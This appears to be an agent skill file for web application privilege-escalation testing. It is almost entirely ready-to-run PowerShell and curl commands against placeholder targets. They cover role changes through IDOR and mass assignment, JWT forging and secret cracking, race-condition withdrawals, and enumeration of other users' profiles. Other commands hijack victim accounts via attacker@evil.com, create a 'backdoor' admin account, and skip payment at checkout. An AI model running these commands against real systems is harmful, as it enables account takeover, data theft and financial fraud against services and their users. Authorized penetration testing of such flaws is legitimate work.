---
name: privesc-techniques
description: Privilege escalation techniques covering IDOR-based escalation, mass assignment, role manipulation, step skipping, race conditions, and workflow abuse. Use when testing admin panels, user role management, or any multi-step privileged operation.
category: cloud-infra
---

# Privilege Escalation Techniques

## IDOR-based Privilege Escalation
```powershell
# Modify user role
curl.exe -X PUT "$U/api/users/me/profile" -H "Authorization: Bearer USER_TOKEN" -d '{"role": "admin"}'

# Modify user type
curl.exe -X PUT "$U/api/users/me" -H "Authorization: Bearer USER_TOKEN" -d '{"user_type": "admin", "is_admin": true}'

# Access admin endpoints with regular user token
curl.exe -s "https://TARGET.COM/api/admin/users" -H "Authorization: Bearer USER_TOKEN"
curl.exe -s "https://TARGET.COM/api/admin/settings" -H "Authorization: Bearer USER_TOKEN"

# Try different user IDs on admin endpoints
1..100 | ForEach-Object {
    $resp = curl.exe -s -o NUL -w "%{http_code}" "https://TARGET.COM/api/admin/users/$_" -H "Authorization: Bearer USER_TOKEN"
    if ($resp -eq "200") { Write-Host "ADMIN IDOR: user $_" }
}
```

## Mass Assignment
```powershell
# Registration with admin flags
curl.exe -X POST "$U/api/register" -H 'Content-Type: application/json' -d '{"email":"attacker@test.com","password":"test123","role":"admin","isAdmin":true,"permissions":["admin","write","delete"],"verified":true,"email_confirmed":true}'

# Profile update with extra fields
curl.exe -X PUT "$U/api/users/me" -H "Authorization: Bearer TOKEN" -H 'Content-Type: application/json' -d '{"name":"test","role":"admin","access_level":"superuser","department":"engineering","user_type":"internal"}'

# Fields to test:
# role, admin, is_admin, isAdmin, permissions, access_level,
# user_type, group, department, superuser, root, staff,
# verified, email_confirmed, active, subscription_tier
```

## Step Skipping in Workflows
```powershell
# Multi-step approval process:
# Step 1: Submit request → pending
# Step 2: Manager approval → approved
# Step 3: Admin review → done

# Try accessing Step 3 directly:
curl.exe -X POST "$U/api/admin/review" -H "Authorization: Bearer TOKEN" -H 'Content-Type: application/json' -d '{"request_id": 123, "status": "approved"}'

# Try accessing final resource:
curl.exe -X GET "$U/api/admin/review/123/result" -H "Authorization: Bearer TOKEN"

# Try API version bypass:
# POST /api/v1/admin/review → blocked
# POST /api/v2/admin/review → bypass?
# POST /api/internal/admin/review → bypass?
```

## Race Conditions (requires parallel execution)
```powershell
# Concurrent privilege escalation - use background jobs
# Balance manipulation
1..20 | ForEach-Object {
    Start-Job -ScriptBlock {
        param($token)
        curl.exe -X POST "https://TARGET.COM/api/wallet/withdraw" -H "Authorization: Bearer $token" -d '{"amount": 1000}'
    } -ArgumentList "TOKEN"
}
Wait-Job -State Completed | Receive-Job
# Check if multiple withdrawals succeeded

# Token refresh race
1..10 | ForEach-Object {
    Start-Job -ScriptBlock {
        curl.exe -X POST "https://TARGET.COM/api/token/refresh" -H "Authorization: Bearer OLD_TOKEN"
    }
}
Wait-Job -State Completed | Receive-Job
# Check if multiple valid tokens were issued
```

## JWT Token Manipulation
```powershell
# Decode JWT
$parts = "eyJhbGciOiJIUzI1NiIs..." -split '\.'
function Decode-JwtPart($part) {
    $part = $part -replace '_','/' -replace '-','+'
    switch ($part.Length % 4) { 1 { $part += "===" } 2 { $part += "==" } 3 { $part += "=" } }
    [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($part))
}
Decode-JwtPart $parts[0]  # Header
Decode-JwtPart $parts[1]  # Payload

# Modify claims: {"role": "user", "exp": 1234567890} → {"role": "admin", "exp": 9999999999}
# Re-sign with weak secret (common: secret, password, 123456, key, jwt_secret)

# Use jwt_tool if Python available
# python jwt_tool.py TOKEN -X k -pk wordlist.txt  # crack secret
# python jwt_tool.py TOKEN -X a  # alg:none attack
# python jwt_tool.py TOKEN -X p  # key pollution
```

## Role-based Access Control Bypass
```powershell
# Test different roles
@("user","admin","superuser","moderator","editor","viewer","guest") | ForEach-Object {
    $resp = curl.exe -X PUT "https://TARGET.COM/api/users/me" -H "Authorization: Bearer TOKEN" -H 'Content-Type: application/json' -d "{\"role\": \"$_\"}" -o NUL -w "%{http_code}"
    Write-Host "$_ : $resp"
}

# Group-based access
curl.exe -X PUT "https://TARGET.COM/api/users/me/groups" -H "Authorization: Bearer TOKEN" -H 'Content-Type: application/json' -d '{"groups": ["admin", "superadmin"]}'

# Permission-based access
curl.exe -X PUT "https://TARGET.COM/api/users/me/permissions" -H "Authorization: Bearer TOKEN" -H 'Content-Type: application/json' -d '{"permissions": ["read", "write", "delete", "admin"]}'
```

## Horizontal Privilege Escalation
```powershell
# Access other users' data
1..500 | ForEach-Object {
    $resp = curl.exe -s -o NUL -w "%{http_code}" "https://TARGET.COM/api/users/$_/profile" -H "Authorization: Bearer TOKEN"
    if ($resp -eq "200") { Write-Host "Accessible: user $_" }
}

# Modify other users' data
curl.exe -X PUT "https://TARGET.COM/api/users/VICTIM_ID/profile" -H "Authorization: Bearer ATTACKER_TOKEN" -H 'Content-Type: application/json' -d '{"email": "attacker@evil.com"}'

# Delete other users' resources
curl.exe -X DELETE "https://TARGET.COM/api/users/VICTIM_ID/documents/DOC_ID" -H "Authorization: Bearer ATTACKER_TOKEN"
```

## Vertical Privilege Escalation
```powershell
# Access admin functionality
curl.exe -X POST "https://TARGET.COM/api/admin/users/create" -H "Authorization: Bearer USER_TOKEN" -H 'Content-Type: application/json' -d '{"email": "backdoor@evil.com", "password": "hacked123", "role": "admin"}'

# Modify system settings
curl.exe -X PUT "https://TARGET.COM/api/admin/settings" -H "Authorization: Bearer USER_TOKEN" -H 'Content-Type: application/json' -d '{"maintenance_mode": false, "debug_mode": true}'

# Access sensitive data
curl.exe -s "https://TARGET.COM/api/admin/audit-logs" -H "Authorization: Bearer USER_TOKEN"
curl.exe -s "https://TARGET.COM/api/admin/all-users" -H "Authorization: Bearer USER_TOKEN"
curl.exe -s "https://TARGET.COM/api/admin/config" -H "Authorization: Bearer USER_TOKEN"
```

## Workflow Abuse Patterns
```powershell
# Price manipulation
curl.exe -X POST "https://TARGET.COM/api/cart/checkout" -H "Authorization: Bearer TOKEN" -H 'Content-Type: application/json' -d '{"items": [{"id": 1, "price": -100}]}'

# Quantity manipulation
curl.exe -X POST "https://TARGET.COM/api/cart/checkout" -H "Authorization: Bearer TOKEN" -H 'Content-Type: application/json' -d '{"items": [{"id": 1, "quantity": -1}]}'

# Coupon reuse
curl.exe -X POST "https://TARGET.COM/api/cart/checkout" -H "Authorization: Bearer TOKEN" -H 'Content-Type: application/json' -d '{"coupon": "DISCOUNT50", "use_count": 999}'

# State bypass
curl.exe -X POST "https://TARGET.COM/api/orders/123/confirm" -H "Authorization: Bearer TOKEN" -H 'Content-Type: application/json' -d '{"status": "paid"}'  # Skip actual payment
```